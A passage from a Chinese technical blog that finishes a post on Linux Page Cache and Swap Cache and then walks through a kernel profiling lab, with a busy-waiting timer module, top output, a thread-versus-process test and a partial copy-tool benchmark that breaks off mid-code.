class="keyword">struct</span> <span class="title">rb_root_cached</span>	<span class="title">i_mmap</span>;</span> <span class="comment">/* 私有映射链表的树 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span>	<span class="title">i_mmap_rwsem</span>;</span> <span class="comment">/* 读写信号量 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		nrpages; <span class="comment">/* 总页数 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		nrexceptional; <span class="comment">/* Shadow or DAX条目,受i_pages锁保护 */</span></span><br><span class="line">	<span class="keyword">pgoff_t</span>			writeback_index; <span class="comment">/* 回写的起始偏移 */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">address_space_operations</span> *<span class="title">a_ops</span>;</span> <span class="comment">/* address_space的操作表 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		flags; <span class="comment">/* gfp_mask掩码与错误标识 */</span></span><br><span class="line">	<span class="keyword">errseq_t</span>		wb_err; </span><br><span class="line">	<span class="keyword">spinlock_t</span>		private_lock; <span class="comment">/* 私有address_space自旋锁 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">private_list</span>;</span> <span class="comment">/* 私有address_space链表 */</span></span><br><span class="line">	<span class="keyword">void</span>			*private_data; <span class="comment">/* 私有数据指针 */</span></span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">long</span>)))) __randomize_layout;</span><br></pre></td></tr></table></figure>
<ul>
<li>结构 <code>address_space-&gt;i_pages</code> 的作用就是用于存储文件的 Page Cache</li>
<li>一个 <code>address_space</code> 与一个偏移量能够确定一个 <code>page cache</code> 或 <code>swap cache</code> 中的一个页面</li>
</ul>
<p><strong>Page Cache</strong></p>
<p>所以为了避免每次读写文件时，都需要对硬盘进行读写操作，Linux 内核使用页缓存（Page Cache）机制来对文件中的数据进行缓存</p>
<ul>
<li>Page Cache 是与文件映射对应的</li>
</ul>
<img src="/2022/10/23/Linux%20Page%20Cache&Swap%20Cache/20200217091156249.png" class width="20200217091156249">  
<ul>
<li>用户对文件的读写会先操作 Page Cache，如果找不到对应的 Page Cache 就会申请一个</li>
<li>修改的页缓存 Page Cache 被称为脏页，内核会定时把这些脏页刷新到文件中</li>
</ul>
<p>如果进程需要 <code>page</code> 而 <code>free page</code> 严重短缺的时候，进程可以唤醒这些内核线程来回收缓存的页面，一方面缓存，一方面回收达到一种平衡，同时改善了系统的性能</p>
<p><strong>Swap</strong></p>
<p>在 Linux 下，当物理内存不足时，拿出部分硬盘空间当 Swap 分区（也被称为“虚拟内存”，从硬盘中划分出的一个分区），从而解决内存容量不足的情况</p>
<ul>
<li>Swap 意思是交换， 当物理内存不够用的时候，内核就会释放缓存区（buffers/cache）里一些长时间不用的程序，然后将这些程序临时放到 Swap 中 </li>
<li>Swap Out：当某进程向OS请求内存发现不足时，OS会把内存中暂时不用的数据交换出去，放在 SWAP 分区中</li>
<li>Swap In：当某进程又需要这些数据且OS发现还有空闲物理内存时，又会把 Swap 分区中的数据交换回物理内存中</li>
</ul>
<p><strong>Swap Cache</strong></p>
<p>Swap Cache 就是 Swap 的缓存，它的作用不是说要加快磁盘的I/O效率</p>
<ul>
<li>Swap Cache 是与匿名页对应的</li>
<li>匿名页是没有关联任何文件的 <code>page</code>，比如用户进程通过 <code>malloc</code> 申请的内存页（函数 <code>mmap</code> 也可以申请匿名页）</li>
</ul>
<img src="/2022/10/23/Linux%20Page%20Cache&Swap%20Cache/20200218152259263.png" class width="20200218152259263"> 
<p>Swap Cache 主要是为了防止页面在 Swap In 和 Swap Out 时进程的同步问题</p>
<ul>
<li>如果页面的数据还没有完全写入磁盘时，这个 <code>page frame</code> 是在 swap cache</li>
<li>等数据完全写入磁盘后，而且没有进程对 <code>page frame</code> 进行访问，那么 swap cache 才会释放 <code>page frame</code>，将其交给 buddy system</li>
<li>匿名页即将被 Swap Out 时会先被放进 Swap Cache，但通常只存在很短暂的时间，因为紧接着在该 <code>page</code> 完全放入磁盘之后它就会从 Swap Cache 中删除（毕竟 Swap Out 的目的就是为了腾出空闲内存）</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/23/Linux-Lab10-Kernel%20Profiling/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/23/Linux-Lab10-Kernel%20Profiling/" class="post-title-link" itemprop="url">Linux-Lab10-Kernel Profiling</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-23 14:21:49 / Modified: 14:23:24" itemprop="dateCreated datePublished" datetime="2022-10-23T14:21:49+08:00">2022-10-23</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Kernel Profiling</strong></p>
<p>实验目标：</p>
<ul>
<li>熟悉 Linux 内核分析的基础知识</li>
<li>了解基本的分析工具</li>
<li>学习剖析方法和良好实践</li>
</ul>
<p>本课程旨在将我们迄今为止在内核空间中所做的工作与现实世界的用例合并，在这些用例中，我们不编写内核空间代码，但我们使用分析工具查看内核，以便调试我们在编写常规的低级应用程序时遇到的问题</p>
<p>本课程的另一个重点是学习调试软件问题的一般方法，我们将介绍一些工具，这些工具让我们从内核中深入了解应用程序的运行方式</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">LABS=kernel_profiling make skels</span><br><span class="line">make build</span><br></pre></td></tr></table></figure>
<p>在使用 I/O 时，我们必须记住，与内存（速度快一个数量级）和调度（处理CPU上当前运行的内容）相比，它是操作系统中最慢的系统之一</p>
<p><strong>Investigating Reduced Responsiveness</strong></p>
<p>在插入 io.ko 模块时会降低系统的响应能力，我们看到命令行在键入命令时会断断续续，但是当运行顶部时，我们看到系统的负载不高，并且没有任何进程占用资源</p>
<p>了解 io.ko 模块正在做什么，以及为什么它会降低系统的响应能力</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/task.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_MAJOR		42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_MINOR		0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODULE_NAME		<span class="meta-string">&quot;deferred&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMER_TYPE_NONE		-1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMER_TYPE_SET		0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMER_TYPE_ALLOC	1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMER_TYPE_MON		2</span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Generate disruptive interrupts&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> <span class="title">timer</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">timer_handler</span><span class="params">(struct timer_list *tl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> deadline = jiffies + HZ;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (jiffies &lt; deadline) &#123;</span><br><span class="line">		(<span class="keyword">void</span>)<span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	mod_timer(&amp;timer, jiffies + HZ);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">deferred_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;[deferred_init] Init module\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	timer_setup(&amp;timer, timer_handler, <span class="number">0</span>);</span><br><span class="line">	mod_timer(&amp;timer, jiffies + <span class="number">5</span> * HZ);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deferred_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mon_proc</span> *<span class="title">p</span>, *<span class="title">n</span>;</span></span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;[deferred_exit] Exit module\n&quot;</span> );</span><br><span class="line"></span><br><span class="line">	del_timer_sync(&amp;timer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(deferred_init);</span><br><span class="line">module_exit(deferred_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>加载内核模块 io.ko 后，程序 shell 有明显的卡顿</li>
<li>使用 <code>top</code> 命令：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Mem: <span class="number">33064</span>K used, <span class="number">205848</span>K <span class="built_in">free</span>, <span class="number">100</span>K shrd, <span class="number">292</span>K buff, <span class="number">4444</span>K cached</span><br><span class="line">CPU:   <span class="number">0</span>% usr   <span class="number">0</span>% sys   <span class="number">0</span>% nic  <span class="number">99</span>% idle   <span class="number">0</span>% io   <span class="number">0</span>% irq   <span class="number">0</span>% sirq</span><br><span class="line">Load average: <span class="number">0.14</span> <span class="number">0.29</span> <span class="number">0.16</span> <span class="number">1</span>/<span class="number">38</span> <span class="number">239</span></span><br><span class="line">  PID  PPID USER     STAT   VSZ %VSZ %CPU COMMAND</span><br><span class="line">  <span class="number">239</span>   <span class="number">208</span> root     R     <span class="number">2972</span>   <span class="number">1</span>%   <span class="number">1</span>% top</span><br><span class="line">   <span class="number">10</span>     <span class="number">2</span> root     IW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">0</span>% [rcu_sched]</span><br><span class="line">  <span class="number">208</span>     <span class="number">1</span> root     S     <span class="number">2972</span>   <span class="number">1</span>%   <span class="number">0</span>% -sh</span><br><span class="line">  <span class="number">198</span>     <span class="number">1</span> root     S     <span class="number">2828</span>   <span class="number">1</span>%   <span class="number">0</span>% /sbin/syslogd -n -O /var/<span class="built_in">log</span>/messages</span><br><span class="line">  <span class="number">202</span>     <span class="number">1</span> root     S     <span class="number">2828</span>   <span class="number">1</span>%   <span class="number">0</span>% /sbin/klogd -n</span><br><span class="line">  <span class="number">207</span>     <span class="number">1</span> root     S     <span class="number">2828</span>   <span class="number">1</span>%   <span class="number">0</span>% /sbin/getty <span class="number">38400</span> tty1</span><br><span class="line">  <span class="number">209</span>     <span class="number">1</span> root     S     <span class="number">2828</span>   <span class="number">1</span>%   <span class="number">0</span>% /sbin/getty <span class="number">38400</span> tty2</span><br><span class="line">  <span class="number">211</span>     <span class="number">1</span> root     S     <span class="number">2828</span>   <span class="number">1</span>%   <span class="number">0</span>% /sbin/getty <span class="number">38400</span> tty4</span><br><span class="line">  <span class="number">210</span>     <span class="number">1</span> root     S     <span class="number">2828</span>   <span class="number">1</span>%   <span class="number">0</span>% /sbin/getty <span class="number">38400</span> tty3</span><br><span class="line">  <span class="number">212</span>     <span class="number">1</span> root     S     <span class="number">2828</span>   <span class="number">1</span>%   <span class="number">0</span>% /sbin/getty <span class="number">38400</span> tty5</span><br><span class="line">  <span class="number">187</span>     <span class="number">1</span> root     S     <span class="number">2828</span>   <span class="number">1</span>%   <span class="number">0</span>% udhcpc -R -b -p /var/run/udhcpc.eth0.p</span><br><span class="line">    <span class="number">1</span>     <span class="number">0</span> root     S     <span class="number">2004</span>   <span class="number">1</span>%   <span class="number">0</span>% init [<span class="number">5</span>]</span><br><span class="line">    <span class="number">9</span>     <span class="number">2</span> root     SW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">0</span>% [ksoftirqd/<span class="number">0</span>]</span><br><span class="line">   <span class="number">42</span>     <span class="number">2</span> root     SWN      <span class="number">0</span>   <span class="number">0</span>%   <span class="number">0</span>% [kmemleak]</span><br><span class="line">   <span class="number">13</span>     <span class="number">2</span> root     SW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">0</span>% [kdevtmpfs]</span><br><span class="line">   <span class="number">39</span>     <span class="number">2</span> root     IW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">0</span>% [kworker/<span class="number">0</span>:<span class="number">2</span>-eve]</span><br><span class="line">    <span class="number">7</span>     <span class="number">2</span> root     IW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">0</span>% [kworker/u2:<span class="number">0</span>-fl]</span><br><span class="line">   <span class="number">34</span>     <span class="number">2</span> root     IW&lt;      <span class="number">0</span>   <span class="number">0</span>%   <span class="number">0</span>% [kworker/<span class="number">0</span>:<span class="number">1</span>H-kb]</span><br><span class="line">   <span class="number">38</span>     <span class="number">2</span> root     IW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">0</span>% [kworker/u2:<span class="number">1</span>-fl]</span><br><span class="line">    <span class="number">2</span>     <span class="number">0</span> root     SW       <span class="number">0</span>   <span class="number">0</span>%   <span class="number">0</span>% [kthreadd]</span><br></pre></td></tr></table></figure>
<ul>
<li>发现没有进程占用资源</li>
</ul>
<p><strong>Launching New Threads</strong></p>
<p>执行调度二进制文件时，它会从 100 个正在运行的实例并行打印消息，有两种形式：</p>
<ul>
<li>创建线程</li>
<li>创建进程</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">helper</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">thread_start</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	helper((<span class="keyword">int</span>) arg);</span><br><span class="line">	pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> pid = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">pthread_t</span> tid[<span class="number">300</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">begin</span>, <span class="title">end</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;./scheduling &lt;mode&gt;\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	gettimeofday(&amp;begin, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">300</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (atoi(argv[<span class="number">1</span>]) == <span class="number">0</span>) &#123;</span><br><span class="line">			pid = pthread_create(&amp;tid[i], <span class="literal">NULL</span>, &amp;thread_start, (<span class="keyword">void</span> *) i);</span><br><span class="line">			<span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			pid = fork();</span><br><span class="line">			<span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">				helper(i);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	gettimeofday(&amp;end, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>进程：结果更加稳定，但速度慢</li>
<li>线程：速度更快，但结果不稳定</li>
</ul>
<p><strong>Tuning CP</strong></p>
<p>我们的目标是在 linux 中编写一个集成在 Linux 中的 cp 工具的副本，该工具已由内存二进制文件实现，它实现了两种我们可以用于复制操作的方法：</p>
<ul>
<li>使用 read 系统调用读取内存中缓冲区中源文件的内容，并使用 write 系统调用将该缓冲区写入目标文件</li>
<li>使用 mmap 系统调用将源文件和目标文件映射到内存，并将源文件的内容复制到内存中的目标文件</li>
</ul>
<p>对比两种方法的性能：</p>
<ul>
<li>调查两种复制机制中的哪一种更快（对于此步骤，您将使用1024块大小）</li>
<li>找到哪种复制机制更快，请更改块大小参数，看看哪个值能为您提供最佳副本</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> src_fd, dst_fd, mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> to_write, size, blk_size;</span><br><span class="line">	<span class="keyword">char</span> *src_p, *dst_p, *buf;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;./memory &lt;mode&gt; &lt;blk_size&gt; &lt;src&gt; &lt;dst&gt;\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mode = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">	blk_size = atoi(argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;mode %d blk_size %ld src %s dst %s\n&quot;</span>,</span><br><span class="line">		mode, blk_size, argv[<span class="number">3</span>], argv[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">	src_fd = open(argv[<span class="number">3</span>], O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span> (src_fd &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> src_fd;</span><br><span class="line"></span><br><span class="line">	stat(argv[<span class="number">3</span>], &amp;st);</span><br><span class="line">	size = to_write = st.st_size;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mode == <span class="number">0</span>) &#123;</span><br><span class="line">		src_p = mmap(<span class="literal">NULL</span>, size, PROT_READ, MAP_SHARED, src_fd, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (src_p &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dst_fd = open(argv[<span class="number">4</span>], O_CREAT | O_RDWR | O_TRUNC, S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH);</span><br><span class="line">	<span class="keyword">if</span> (dst_fd &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	ftruncate(dst_fd, size);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mode == <span class="number">0</span>) &#123;</span><br><span class="line">		dst_p = mmap(<span class="literal">NULL</span>, size, PROT_WRITE | PROT_READ, MAP_SHARED, dst_fd, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (dst_p &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	buf = <span class="built_in">malloc</span>(blk_size);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (to_write &gt; blk_size) &#123;</span><br><span class="line">		<span class="keyword">if</span> (mode == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">memcpy</span>(dst_p, src_p, blk_size);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			pread(src_fd, buf, blk_size, size - to_write);</span><br><span class="line">			pwrite(dst_fd, buf, 